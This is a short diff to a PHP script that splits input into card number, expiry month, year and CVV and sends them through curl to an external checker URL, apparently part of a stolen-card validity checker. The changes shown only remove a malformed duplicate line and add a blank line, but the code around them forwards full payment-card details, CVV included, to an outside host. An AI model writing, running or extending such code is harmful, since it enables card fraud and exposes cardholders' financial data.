@@ -48,7 +48,6 @@ $ano = $separa[2];
 $cvv = $separa[3];
 
 $ch = curl_init();
-curl_$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://lista-production-9b29.up.railway.app/chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -70,6 +69,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 'sec-fetch-dest: document',
 'accept-language: en-US,en;q=0.9',
   ));
+
 # ----------------- [2req Postfields] ---------------------#
 
 $result2a = curl_exec($ch);
